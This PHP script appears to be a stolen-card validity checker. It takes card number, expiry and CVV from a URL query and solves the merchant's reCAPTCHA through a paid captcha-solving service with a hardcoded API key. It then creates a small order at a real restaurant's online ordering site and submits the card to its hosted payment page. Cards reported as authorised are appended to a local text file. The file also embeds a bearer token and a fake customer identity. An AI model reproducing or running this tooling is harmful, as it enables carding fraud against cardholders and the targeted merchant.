<?php
error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);
date_default_timezone_set('Africa/Accra');
ini_set('memory_limit', '-1');

function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$dispositivo5 = rand(0,255);
$ip2 = rand(0,255);
$ip3 = rand(0,255);
$ip4 = rand(0,255);
$ip1 = rand(0,255);


if($_GET['testar']=="cc"){
    $ccs = $_GET['ccs'];
    $separador  = $_GET['separador'];
    $id   = $_GET['id'];
    $explode = explode($separador, $ccs);

    $numero = $explode[0];
    $mes = $explode[1];
    $ano = $explode[2];
    $cvv = $explode[3];
    $ano_1 = substr($ano,'2','2');


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.anti-captcha.com/createTask");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Content-Type: application/json',
    ));
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "clientKey":"058283855a07f8bf5e71b8ef716a6762",
    "task":
        {
           "type":"RecaptchaV2TaskProxyless",
                   "websiteURL":"https://dextercreamery.revelup.com/weborder/?establishment=1#checkout",
            "websiteKey":"6Ld4hsgUAAAAACpJsfH-QTkIIcs0NAUE1VzDZ8Xq"
        }
}');
    $dom1 = curl_exec($ch);
    $key = value($dom1,'taskId":','}');

    $i = 0;
    while ($i<1){

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.anti-captcha.com/getTaskResult");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Accept: application/json, text/javascript, */*; q=0.01',
            'Content-Type: application/json',
        ));
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{
    "clientKey":"058283855a07f8bf5e71b8ef716a6762",
    "taskId":'.$key.'
}');
        $dom1 = curl_exec($ch);
        if (strpos($dom1, 'processing') !== false) {
            $i=0;
            sleep(3);
        }elseif(strpos($dom1, 'ready') !== false) {
            $key = value($dom1,'gRecaptchaResponse":"','"');

            $i=100;
        }

    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://dextercreamery.revelup.com/weborders/create_order_and_pay_v1/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: dextercreamery.revelup.com',
        'Connection: close',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'X-Requested-With: ',
        'Authorization: Bearer N6ZcLb1ZkYskNsVqc3sbCjJSDKfgZGfMUkg8feKLpZgecEIthUP1CCUeso2O',
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 OPR/64.2.3282.60128',
        'X-Revel-Client: RevelOnlineOrdering',
        'Content-Type: application/json',
        'Origin: https://dextercreamery.revelup.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://dextercreamery.revelup.com/weborder/?establishment=1',
        'Accept-Encoding: gzip, deflate',
        'Accept-Language: pt-BR,pt;q=0.9,en-us;q=0.8,en;q=0.7',
    ));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[{"modifier":205,"modifier_cost":0,"modifier_price":0,"qty":1,"qty_type":0,"admin_mod_key":null}],"special_request":"","price":2.99,"product":119,"product_name_override":"Kids Scoop","quantity":1,"product_sub_id":"c484"}],"orderInfo":{"non_contact_delivery":false,"created_date":"2021-08-14T21:36:03","pickup_time":"2021-08-14T21:40:57","lastPickupTime":"2021-08-15T02:55:00","dining_option":4,"notes":"","pickup_data":null,"asap":true,"customer":{"phone":"7897897898","email":"a@tmpbox.net","first_name":"Rafael","last_name":"Silva"},"call_name":"Rafael Silva / ASAP (Aug 14, 5:40pm) / 7897897898"},"paymentInfo":{"tip":0,"type":2,"cardInfo":{"firstDigits":"","lastDigits":"","firstName":"","lastName":"","address":null}},"notifications":[{"skin":"weborder","type":"email","destination":"a@tmpbox.net"}],"recaptcha_v2_token":"'.$key.'"}');
    $dom = curl_exec($ch);
    ################################################################################################################################### end
    $respo = value($dom,'TransactionSetupID": "','"');

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$respo&");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: transaction.hostedpayments.com',
        'Connection: close',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 OPR/64.2.3282.60128',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-Fetch-Site: cross-site',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Dest: iframe',
        'Referer: https://dextercreamery.revelup.com/',
        'Accept-Encoding: gzip, deflate',
        'Accept-Language: pt-BR,pt;q=0.9,en-us;q=0.8,en;q=0.7',
    ));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $dom = curl_exec($ch);
    ################################################################################################################################### end
    $VIEWSTATE = value($dom,'name="__VIEWSTATE" id="__VIEWSTATE" value="','"');
    $EVENTVALIDATION = value($dom,'name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="','"');
    $VIEWSTATEGENERATOR = value($dom,'name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="','"');

    $alterado = array("+","/","=");
    $alterar = array("%2B","%2F","%3D");
    $url = str_replace($alterado, $alterar,$VIEWSTATE);

    $alterado = array("+","/","=");
    $alterar = array("%2B","%2F","%3D");
    $PaR = str_replace($alterado, $alterar,$EVENTVALIDATION);
    ############################OK########################################################################################################## Curl
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$respo&");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: transaction.hostedpayments.com',
        'Connection: close',
        'Cache-Control: no-cache',
        'X-Requested-With: XMLHttpRequest',
        'X-MicrosoftAjax: Delta=true',
        'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 OPR/64.2.3282.60128',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'Accept: */*',
        'Origin: https://transaction.hostedpayments.com',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://transaction.hostedpayments.com/?TransactionSetupID='.$respo.'&',
        'Accept-Encoding: gzip, deflate',
        'Accept-Language: pt-BR,pt;q=0.9,en-us;q=0.8,en;q=0.7',
    ));
    curl_setopt($ch, CURLOPT_COOKIESESSION, true);
    curl_setopt($ch, CURLOPT_ENCODING, "gzip");
    curl_setopt($ch, CURLOPT_COOKIEJAR, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIEFILE, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIE, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_COOKIESESSION, dirname(__FILE__) ."/$dispositivo5.txt");
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POSTFIELDS, "scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=$url&__VIEWSTATEGENERATOR=$VIEWSTATEGENERATOR&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=$PaR&hdnCancelled=&cardNumber=$numero&ddlExpirationMonth=$mes&ddlExpirationYear=$ano_1&CVV=$cvv&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&hdnEncoded=&__ASYNCPOST=true&");
    $dom = curl_exec($ch);
    ################################################################################################################################### end

    echo $dom;


    if (strpos($dom1, 'status":4,"elegivel":true') !== false) {

        echo "Autorizada - "."$numero|$nome|$mae|$datanascimento| ";
        $cc0 = "$numero|$nome|$mae|$datanascimento" ."\n";
        $diretorio = "salva/";
        $fp = fopen("ctsemcadastrostatus4" . ".txt", "a");
        $escreve = fwrite($fp, $cc0);
        fclose($fp);

    }




}










